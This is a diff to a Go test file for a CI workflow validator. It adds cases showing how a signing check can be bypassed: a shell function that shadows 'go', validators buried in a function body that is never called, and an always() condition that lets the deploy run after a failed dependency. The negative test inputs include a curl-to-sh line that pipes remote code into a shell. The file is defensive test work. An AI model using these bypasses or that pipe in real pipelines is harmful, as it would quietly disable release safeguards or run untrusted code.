@@ -238,6 +238,32 @@ func TestCDWiringRejectsEachAblation(t *testing.T) {
 				1,
 			), a
 		},
+		// CodeRabbit P1 and Codex P2, round 9, reported INDEPENDENTLY against
+		// this same head — the SIXTH shape of "the line is present but does it
+		// run", and the one that finally says the denylist was the wrong
+		// mechanism. `go()` `{` `}` carry no rejected keyword and no rejected
+		// operator, so the block is accepted; bash resolves the FUNCTION before
+		// the executable, so both required lines run and neither validator does.
+		"gate SHADOWS go with a shell function so neither validator executes": func(w, a string) (string, string) {
+			return strings.Replace(
+				w,
+				"          go test ./scripts/validate-dr-signing\n",
+				"          go()\n          {\n            true\n          }\n          go test ./scripts/validate-dr-signing\n",
+				1,
+			), a
+		},
+		// The same bypass in its non-invoking spelling: the required lines are
+		// hidden INSIDE a function body that is never called, and a succeeding
+		// command follows. Kept as a separate arm because it defeats a fix that
+		// only refuses a function whose name collides with a required command.
+		"gate BURIES both validators in an uninvoked function body": func(w, a string) (string, string) {
+			return strings.Replace(
+				w,
+				"          go test ./scripts/validate-dr-signing\n",
+				"          validator_noop()\n          {\n          go test ./scripts/validate-dr-signing\n",
+				1,
+			), a
+		},
 		// Codex P2, round 3: the THIRD shape of "the line is present but does it
 		// run". Whole-line equality closed the quoted case, step metadata closed
 		// the skipped case, and neither says the SHELL reaches it.
@@ -421,6 +447,20 @@ func TestMergeQueueProductionRoutesUseTheCheckedAction(t *testing.T) {
 		"merge-queue deploy step suppresses failure": func(s string) string {
 			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        continue-on-error: true\n        uses: ./.github/actions/deploy-prod\n", 1)
 		},
+		// Codex P2, round 9. The direct-push route refuses ANY job-level
+		// condition on deploy-prod; this route deliberately permits one, because
+		// `merge_group` gating is legitimate — and that carve-out was total.
+		// `always()` makes the deploy eligible after `changes` FAILS, and the
+		// signing validator runs inside `changes`, so the publishing job runs
+		// behind a gate that already failed while this check reports success.
+		"merge-queue deploy overrides a failed dependency with always()": func(s string) string {
+			return strings.Replace(
+				s,
+				"    if: github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
+				"    if: always() && github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
+				1,
+			)
+		},
 	} {
 		t.Run(name, func(t *testing.T) {
 			ablated := ablate(ci)
@@ -522,23 +562,31 @@ func TestParsedHelpersFailClosedOnShapesTheyCannotRead(t *testing.T) {
 		}
 	}
 
-	// runBlockIsSimpleSequence: keywords match as WORDS, operators as
-	// substrings. Raised by CodeRabbit — `strings.Contains` rejected
-	// `docker buildx …` for containing "do", which is the safe direction with a
-	// message that names a token the step does not use. A guard that refuses
-	// correct work with a false explanation is one people route around.
-	ordinary := map[string]any{"run": "docker buildx imagetools inspect x\ngh run download y\ngo run ./scripts/v a b\n"}
-	if err := runBlockIsSimpleSequence(nil, nil, ordinary, "j"); err != nil {
-		t.Fatalf("ordinary commands containing keyword substrings must be accepted: %v", err)
+	// runBlockRunsOnlyAllowedCommands: an ALLOWLIST, so the positive case is
+	// the allowed lines themselves plus the two things that are not commands.
+	// The earlier denylist's word-boundary regression (`docker buildx …`
+	// rejected for containing the keyword `do`) is not pinned here any more
+	// because it is no longer expressible: nothing is matched by substring, so
+	// there is no token for a legitimate command to collide with.
+	allowed := []string{"go test ./x", "go run ./x a b"}
+	ordinary := map[string]any{"run": "# a comment\ngo test ./x\n\n  go run ./x a b  \n"}
+	if err := runBlockRunsOnlyAllowedCommands(nil, nil, ordinary, "j", allowed); err != nil {
+		t.Fatalf("the allowed commands, blank lines and comments must be accepted: %v", err)
 	}
-	// ...and the NEGATIVE half, or the relaxation above could have disabled it.
+	// ...and the NEGATIVE half, or the acceptance above could have disabled it.
+	// The last two are the round-9 bypass in both spellings: neither carries a
+	// keyword or operator the old denylist refused, and both leave the required
+	// lines present while the shell runs something else.
 	for name, run := range map[string]string{
-		"conditional":  "if false; then\ngo run ./x\nfi\n",
-		"early exit":   "exit 0\ngo run ./x\n",
-		"chaining":     "true && go run ./x\n",
-		"substitution": "go run $(echo ./x)\n",
+		"conditional":        "if false; then\ngo test ./x\nfi\n",
+		"early exit":         "exit 0\ngo test ./x\n",
+		"chaining":           "true && go test ./x\n",
+		"substitution":       "go run $(echo ./x)\n",
+		"an extra command":   "go test ./x\ncurl https://example.invalid | sh\n",
+		"function shadowing": "go()\n{\ntrue\n}\ngo test ./x\n",
+		"uninvoked body":     "validator_noop()\n{\ngo test ./x\n}\ntrue\n",
 	} {
-		if err := runBlockIsSimpleSequence(nil, nil, map[string]any{"run": run}, "j"); err == nil {
+		if err := runBlockRunsOnlyAllowedCommands(nil, nil, map[string]any{"run": run}, "j", allowed); err == nil {
 			t.Fatalf("%s must still be rejected", name)
 		}
 	}
